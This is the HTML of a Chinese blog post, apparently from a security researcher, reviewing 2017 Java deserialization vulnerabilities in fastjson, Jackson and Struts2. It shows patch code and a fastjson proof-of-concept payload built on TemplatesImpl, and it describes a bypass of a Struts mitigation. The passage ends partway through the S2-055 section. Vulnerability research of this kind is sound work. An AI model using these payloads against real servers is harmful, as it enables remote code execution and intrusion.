@@ -1,0 +1,1349 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="eOKt_3ycRCL7ILr4F1AM1eilrWXcADidutENpULFpsE" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="反序列化,Struts2,XStream,XMLDecoder,fastjson,Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告,WebLogic," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="xxlegend" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="2017年反序列化漏洞年度报告Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告  背景2017年OWASP发布了新的十大web漏洞威胁，其中A8:2017就是不安全的反序列化，A9:2017-使用含有已知漏洞的组件也和反序列化紧密相连，这是因为在Java开发中很多代码都依赖于第三方组件，而这些组件可能会存在反序列漏洞，典型的例子就是J">
+<meta name="keywords" content="反序列化,Struts2,XStream,XMLDecoder,fastjson,Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告,WebLogic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017年反序列化漏洞年度报告">
+<meta property="og:url" content="http://xxlegend.com/2018/01/25/2017年反序列化漏洞年度报告/index.html">
+<meta property="og:site_name" content="xxlegend">
+<meta property="og:description" content="2017年反序列化漏洞年度报告Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告  背景2017年OWASP发布了新的十大web漏洞威胁，其中A8:2017就是不安全的反序列化，A9:2017-使用含有已知漏洞的组件也和反序列化紧密相连，这是因为在Java开发中很多代码都依赖于第三方组件，而这些组件可能会存在反序列漏洞，典型的例子就是J">
+<meta property="og:image" content="http://xxlegend.com/images/2017_1.png">
+<meta property="og:updated_time" content="2018-01-25T03:43:05.944Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2017年反序列化漏洞年度报告">
+<meta name="twitter:description" content="2017年反序列化漏洞年度报告Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告  背景2017年OWASP发布了新的十大web漏洞威胁，其中A8:2017就是不安全的反序列化，A9:2017-使用含有已知漏洞的组件也和反序列化紧密相连，这是因为在Java开发中很多代码都依赖于第三方组件，而这些组件可能会存在反序列漏洞，典型的例子就是J">
+<meta name="twitter:image" content="http://xxlegend.com/images/2017_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"right","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://xxlegend.com/2018/01/25/2017年反序列化漏洞年度报告/"/>
+
+
+
+
+
+  <title>2017年反序列化漏洞年度报告 | xxlegend</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ae110488ae3a7a2872b00e735070cfbc";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xxlegend</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/01/25/2017年反序列化漏洞年度报告/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                2017年反序列化漏洞年度报告
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-25T11:39:30+08:00">
+                2018-01-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/01/25/2017年反序列化漏洞年度报告/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/01/25/2017年反序列化漏洞年度报告/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/01/25/2017年反序列化漏洞年度报告/" class="leancloud_visitors" data-flag-title="2017年反序列化漏洞年度报告">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="2017年反序列化漏洞年度报告"><a href="#2017年反序列化漏洞年度报告" class="headerlink" title="2017年反序列化漏洞年度报告"></a>2017年反序列化漏洞年度报告</h1><p>Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告</p>
+<hr>
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>2017年OWASP发布了新的十大web漏洞威胁，其中A8:2017就是不安全的反序列化，A9:2017-使用含有已知漏洞的组件也和反序列化紧密相连，这是因为在Java开发中很多代码都依赖于第三方组件，而这些组件可能会存在反序列漏洞，典型的例子就是Jackson，fastjson，XStream，XMLDecoder等开源组件。绿盟科技NS-SRC 处理的漏洞应急中就有很大一部分是反序列化漏洞，下面我们来一一分析2017年我们应急的那些反序列化漏洞。<br>总得来说，2017年出现的反序列化漏洞和以往反序列漏洞在漏洞形成方式上不太一样，在以往都是由于Java自身的反序列特征导致的漏洞，2017年则多了fastjson，Jackson等，这两个库都能将json文本转换成具体的java bean，在这个转换过程中会导致远程代码执行。<br>本报告重点回顾2017年绿盟科技重点应急，影响面非常广的那些反序列化漏洞。从这个报告中能看出反序列化漏洞的发展，攻击方和防御方不停的对抗过程，bypass和反bypass在这个过程中体现得淋漓尽致。</p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><img src="/images/2017_1.png" alt="应急路线图"></p>
+<p>从3月份爆出Fastjson的反序列化特性导致的远程代码执行，四月份则是Jackson，Log4j2，Jenkins的反序列化造成的远程代码执行，接着6月份流出了Weblogic CVE-2017-3248的利用代码。稍微消停了一会，Struts2又被安全研究人员盯上，爆出Struts2-052，又是一个远程代码执行。在11月份，由于Jackson官方对漏洞不敏感，接着又被曝CVE-2017-15095，又一个绕过。进入12月份，Fastjson和Jackson相继发布了几个补丁修复那些黑名单的绕过；Weblogic XMLDecoder(CVE-2017-10352)的漏洞被广泛应用于于挖坑。由于很多漏洞都是远程代码执行，有的一个HTTP POST请求就能getshell，所以备受黑产亲睐。</p>
+<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="1-fastjson反序列化漏洞"><a href="#1-fastjson反序列化漏洞" class="headerlink" title="1 fastjson反序列化漏洞"></a>1 fastjson反序列化漏洞</h2><p>2017年3月15日，fastjson官方发布安全公告表示fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。fastjson官方建议直接升级到1.2.28/1.2.29或者更新版本来保证系统安全。4月29日，本文作者（xxlegend）构造出了Fastjson的反序列漏洞的PoC，引起了安全圈的广泛讨论。详细的分析可参照<a href="http://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/" target="_blank" rel="external">1</a>，下面做简单的回顾。</p>
+<h3 id="1-1-补丁"><a href="#1-1-补丁" class="headerlink" title="1.1 补丁"></a>1.1 补丁</h3><p>在ParserConfig.java中添加了checkAutoType，不论用户是否开启了autoTypeSupport功能，在类名被加载时都需要通过额外的一层处理（来判断是否在acceptlist里），只有满足了此限制的类名才会被加载。另外引入了黑名单机制，在开启了autoTypeSupport的情况下，如果加载的是黑名单中类也会抛出异常。补丁核心代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</div><div class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (typeName.length() &gt;= maxTypeNameLength) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</div><div class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</div><div class="line">                String accept = acceptList[i];</div><div class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</div><div class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</div><div class="line">                String deny = denyList[i];</div><div class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</div><div class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</div><div class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</div><div class="line">            clazz = deserializers.findClass(typeName);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> clazz;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<h3 id="1-2-初略分析"><a href="#1-2-初略分析" class="headerlink" title="1.2 初略分析"></a>1.2 初略分析</h3><p>静态分析得知，要构造一个可用的poc，肯定得引入denyList的库。这里我们就引入com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</div><div class="line">       String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</div><div class="line">               <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</div><div class="line">               <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</div><div class="line">       System.out.println(text1);</div><div class="line">      </div><div class="line">       Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</div></pre></td></tr></table></figure></p>
+<p>最核心的部分是_bytecodes，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。整个PoC的执行过程的调用栈如下:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">JSON.parseObject</div><div class="line">...</div><div class="line">JavaBeanDeserializer.deserialze</div><div class="line">...</div><div class="line">FieldDeserializer.setValue</div><div class="line">...</div><div class="line">TemplatesImpl.getOutputProperties</div><div class="line">TemplatesImpl.newTransformer</div><div class="line">TemplatesImpl.getTransletInstance</div><div class="line">...</div><div class="line">Runtime.getRuntime().exec</div></pre></td></tr></table></figure></p>
+<p>更多的原理分析可见<a href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/">2</a> 。</p>
+<h3 id="1-3-后续官方修补"><a href="#1-3-后续官方修补" class="headerlink" title="1.3 后续官方修补"></a>1.3 后续官方修补</h3><p>fastjson官方后续又添加了一些补丁，本文作者给fastjson官方提交了两次绕过，fastjson官方都发布了相应更新。具体如下：</p>
+<ol>
+<li>fastjson-1.2.34版本发布，当autoType=true时增强安全防护</li>
+<li>fastjson-1.2.42版本发布 Bug修复安全加固</li>
+<li>fastjson-1.2.43版本发布 Bug修复安全加固</li>
+<li>fastjson-1.2.44版本发布 Bug修复安全加固</li>
+</ol>
+<p>在fastjson-1.2.42版本中通过异或操作混淆了其黑名单，可以阻挡一部分人分析其黑名单内容，其实这是自欺欺人的。具体的黑名单分析读者可以自行研究。</p>
+<h2 id="2-Jackson反序列化"><a href="#2-Jackson反序列化" class="headerlink" title="2 Jackson反序列化"></a>2 Jackson反序列化</h2><p>Jackson是一个开源的Java序列化与反序列化工具，可以将java对象序列化为xml或json格式的字符串，或者反序列化回对应的对象，由于其使用简单，速度较快，且不依靠除JDK外的其他库，被众多用户所使用。但是其组件Jackson-databind可以指定特定的反序列化类，这样就存在代码执行的风险。</p>
+<h3 id="2-1-CVE-2017-7525"><a href="#2-1-CVE-2017-7525" class="headerlink" title="2.1 CVE-2017-7525"></a>2.1 CVE-2017-7525</h3><p>这个CVE是本文作者报告的。下面来看一个Jackson官方的补丁，这个补丁主要是将TemplatesImpl加入了黑名单，从后续的CVE就可以看出这是远远不够的，可以通过各种方式绕过。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">+    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">checkIllegalTypes</span><span class="params">(DeserializationContext ctxt, JavaType type,</span></span></div><div class="line">+            BeanDescription beanDesc)</div><div class="line">+        <span class="keyword">throws</span> JsonMappingException</div><div class="line">+    &#123;</div><div class="line">+        <span class="comment">// There are certain nasty classes that could cause problems, mostly</span></div><div class="line">+        <span class="comment">// via default typing -- catch them here.</span></div><div class="line">+        Class&lt;?&gt; raw = type.getRawClass();</div><div class="line">+        String name = raw.getSimpleName();</div><div class="line">+</div><div class="line">+        <span class="keyword">if</span> (<span class="string">"TemplatesImpl"</span>.equals(name)) &#123; <span class="comment">// [databind#1599]</span></div><div class="line">+            <span class="keyword">if</span> (raw.getName().startsWith(<span class="string">"com.sun.org.apache.xalan"</span>)) &#123;</div><div class="line">+                <span class="keyword">throw</span> JsonMappingException.from(ctxt,</div><div class="line">+                        String.format(<span class="string">"Illegal type (%s) to deserialize: prevented for security reasons"</span>,</div><div class="line">+                                name));</div><div class="line">+            &#125;</div><div class="line">+        &#125;</div><div class="line">+    &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
+<h3 id="2-1-1-分析"><a href="#2-1-1-分析" class="headerlink" title="2.1.1 分析"></a>2.1.1 分析</h3><p>Jackson在反序列的过程中，首先扫描输入的json文件，分析其要反序列的类，通过反射的方式获取该类的构造方法，包括无参构造方法和有参构造方法，获取其setter，getter方法用于操作具体的类的属性。反序列的过程就是先通过反射得到一个实例，通过其setter或者getter方法给该实例的属性赋值，当然如果引入的类的setter方法或者getter方法中存在执行一些一些危险的操作，如利用rmi远程加载类则会造成远程代码执行缺陷。PoC示例图!(Jackson)[/images/2017_2.png]<br>详细分析可参考<a href="http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/" target="_blank" rel="external">3</a>。</p>
+<h3 id="后续官方修补"><a href="#后续官方修补" class="headerlink" title="后续官方修补"></a>后续官方修补</h3><p>CVE-2017-15095是CVE-2017-7525的延续，这个漏洞同样也是本文作者报告的。同样是黑名单的绕过。<br>CVE-2017-17485是CVE-2017-7525的延续，这个漏洞引入的类是<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>,利用这个库的bean重新生成类，而这个bean所依赖的xml是由攻击者来定制的。从这里也可以看出黑名单就是个无底洞，深不可见，bypass也是不完。由于Jackson的特性，可以预测，Jackson在2018年还将出现更多的绕过。</p>
+<h2 id="3-Struts2"><a href="#3-Struts2" class="headerlink" title="3 Struts2"></a>3 Struts2</h2><p>struts2号称漏洞之王，2017应急中就处理了S2-045，S2-046，S2-48，S2-052，S2-055，都是远程代码执行级别的漏洞。S2-045的PoC现在还被黑客用于各种漏洞扫描，挖矿。既然是漏洞之王，那自然少不了反序列化，S2-052（CVE-2017-9805）就是XStream使用不当造成的反序列化。S2-055则是由于Jackson-databind导致的反序列化。这两个漏洞的典型特点都是不恰当的使用第三方库导致的。</p>
+<h3 id="3-1-S2-052分析"><a href="#3-1-S2-052分析" class="headerlink" title="3.1 S2-052分析"></a>3.1 S2-052分析</h3><p>根据官方的描述信息来看，是REST插件使用到XStreamHandler处理xml数据的时候，由于未对xml数据做任何过滤，在进行反序列将xml数据转换成Object时导致的RCE。</p>
+<h4 id="3-1-1-补丁"><a href="#3-1-1-补丁" class="headerlink" title="3.1.1 补丁"></a>3.1.1 补丁</h4><p>补丁的核心部分如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">+    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addDefaultPermissions</span><span class="params">(ActionInvocation invocation, XStream stream)</span> </span>&#123;</div><div class="line"> +        stream.addPermission(<span class="keyword">new</span> ExplicitTypePermission(<span class="keyword">new</span> Class[]&#123;invocation.getAction().getClass()&#125;));</div><div class="line"> +        <span class="keyword">if</span> (invocation.getAction() <span class="keyword">instanceof</span> ModelDriven) &#123;</div><div class="line"> +            stream.addPermission(<span class="keyword">new</span> ExplicitTypePermission(<span class="keyword">new</span> Class[]&#123;((ModelDriven) invocation.getAction()).getModel().getClass()&#125;));</div><div class="line"> +        &#125;</div><div class="line"> +        stream.addPermission(NullPermission.NULL);</div><div class="line"> +        stream.addPermission(PrimitiveTypePermission.PRIMITIVES);</div><div class="line"> +        stream.addPermission(ArrayTypePermission.ARRAYS);</div><div class="line"> +        stream.addPermission(CollectionTypePermission.COLLECTIONS);</div><div class="line"> +        stream.addPermission(<span class="keyword">new</span> ExplicitTypePermission(<span class="keyword">new</span> Class[]&#123;Date.class&#125;));</div><div class="line"> +    &#125;</div></pre></td></tr></table></figure></p>
+<p>主要就是将xml中的数据白名单化，把Collection和Map，一些基础类，时间类放在白名单中，这样就能阻止XStream反序列化的过程中带入一些有害类。</p>
+<h4 id="3-1-2-分析"><a href="#3-1-2-分析" class="headerlink" title="3.1.2 分析"></a>3.1.2 分析</h4><p>首先分析入口文件，在Struts2的配置文件中有如下xml描述信息：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">type</span>=<span class="string">"org.apache.struts2.rest.handler.ContentTypeHandler"</span> <span class="attr">name</span>=<span class="string">"xml"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.rest.handler.XStreamHandler"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.action.extension"</span> <span class="attr">value</span>=<span class="string">"xhtml,,xml,json"</span>/&gt;</span></div></pre></td></tr></table></figure>
+<p>也就是说ContentType为xml的所有请求都会交给XStreamHandler来处理，XStreamHanler.toObject调用了XStream.fromXml来处理那些请求中的xml信息，从而进入反序列化流程。<br>这里面最有意思的应该是官方给的临时缓解措施不起作用，官方给出的缓解措施<code>&lt;constant name=&quot;struts.action.extension&quot; value=&quot;xhtml,,,json&quot; /&gt;</code>，从字面意思也能看出来，这个是针对action的后缀的，也就是说如果后缀不带xml也就可以绕过。而POST请求一般不带xml后缀直接忽视这个缓解措施。下图就是一个示例：!(struts2)[/images/2017_3.png]<br>所以说Struts的官方也是根据PoC修漏洞，没完全测试过的东西就直接放出来。XStream只跟Content-Type有关，如果Content-Type中含有xml，则会交给XStream处理，更多的详情分析见<a href="http://blog.nsfocus.net/struts2-s2-052-rest-plug-in-remote-code-execution-technical-analysis/" target="_blank" rel="external">4</a></p>
+<h3 id="3-2-S2-055分析"><a href="#3-2-S2-055分析" class="headerlink" title="3.2 S2-055分析"></a>3.2 S2-055分析</h3><p>2017年12月1日，Apache Struts发布最新的安全公告，Apache Struts 2.5.x REST插件存在远程代码执行的中危漏洞，漏洞编号与CVE-2017-7525相关。漏洞的成因是由于使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。当然官方说的影响是未知，其实这里是远程代码执行。</p>
+<h4 id="S2-055补丁"><a href="#S2-055补丁" class="headerlink" title="S2-055补丁"></a>S2-055补丁</h4><p>没有提供补丁，只是提醒升级Jackson库版本。</p>
+<h4 id="S2-055分析"><a href="#S2-055分析" class="headerlink" title="S2-055分析"></a>S2-055分析</h4><p>为了让Jackson支持多态，Jackson官方提供了几种方式，第一种全局Default Typing机制，第二种为相应的class添加@JsonTypeInfo注解。这里会启用第二种方式，在第二种方式中，大体代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)</div><div class="line">    <span class="keyword">public</span> Object clientName;</div></pre></td></tr></table></figure></p>
